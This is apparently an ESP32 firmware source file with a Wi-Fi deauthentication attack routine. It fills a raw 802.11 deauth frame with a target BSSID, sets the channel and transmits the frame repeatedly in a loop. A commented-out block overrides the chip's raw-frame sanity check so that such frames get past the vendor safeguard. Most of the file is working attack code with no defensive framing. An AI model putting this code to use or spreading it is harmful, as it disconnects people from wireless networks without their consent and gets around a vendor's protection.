// pid 11

#include "esp_wifi.h"
#include "esp_system.h"

wifi_ap_record_t ap_record;

// #ifndef PLATFORMIO
// extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
// 	if (arg == 31337)
// 		return 1;
// 	else
// 		return 0;
// }
// #endif

static const uint8_t deauth_frame_default[] = {
	0xc0, 0x00, 0x3a, 0x01,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xf0, 0xff, 0x02, 0x00
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
	Serial.println("The deauth frame is sent");
}

void wsl_bypasser_send_deauth_frame(const uint8_t* bssid, int chan) {
	esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
	delay(50);
	memcpy(&deauth_frame[10], bssid, 6);
	memcpy(&deauth_frame[16], bssid, 6);
	wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}


void wifiDeauthLoop() {
	if (isSetup()) {
		String lines[] = {
			ssid,
			String(WiFi.RSSI(cursor - 2))
		};

		centeredPrintRows(lines, 2, MEDIUM_TEXT);

		WiFi.mode(WIFI_AP);
		WiFi.softAP(ssid, "", channel, 1, 4, false);
		IPAddress ip = WiFi.softAPIP();
		memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
	}
	
	wsl_bypasser_send_deauth_frame(bssid, channel);
	
	// wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
	
	
	checkExit();
}